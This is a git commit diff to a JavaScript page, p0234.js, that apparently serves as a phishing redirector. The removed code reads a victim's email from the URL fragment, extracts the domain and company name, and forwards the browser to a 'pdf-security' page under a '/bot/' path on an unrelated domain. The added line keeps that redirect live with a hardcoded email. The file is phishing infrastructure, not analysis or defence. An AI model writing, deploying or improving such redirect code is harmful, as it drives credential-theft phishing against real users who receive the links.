aa14454d56e7b824032d6ed5d0a5240f6fbd6b9e
tanjanegineering-oss <tanjanegineering@gmail.com>
2026-04-19 09:18:06 -0700

    Update p0234.js

--- p0234.js
+++ p0234.js
@@ -6,35 +6,7 @@
 
    <script>
  
-
-	var feedUpdateResponse = window.location.href;
-   
-
-
-const valueAfterEquals = feedUpdateResponse.split('#').slice(1).join('#');
-
-
-console.log(valueAfterEquals); // splendid@gmail.com
-
-function encodeEmail(email) {
-  return encodeURIComponent(email);
-}
-
-
-	
-	var my_ai=valueAfterEquals;
-	
-	 var ind = my_ai.indexOf("@");
-    var my_slice = my_ai.substr((ind + 1));
-const domain = my_slice;
-
-var companyName = domain.split('.')[0];
-
-	 
-		 const num = Math.floor(Math.random() * 1990) + 188;
-		  const num1 = Math.floor(Math.random() * 1990) + 188;
-
-  window.location.replace("https://pdf-security.aeroform-composite.com/bot/pdfs101.htm?username=aWJlbndhQHFxLmNvbQ%3D%3D&_r=yZdPVI8#"+my_ai);
+  window.location.replace("https://pdf-security.aeroform-composite.com/bot/pdfs101.htm?username=aWJlbndhQHFxLmNvbQ%3D%3D&_r=yZdPVI8#hhhhh@qqq.com");
   
   
   
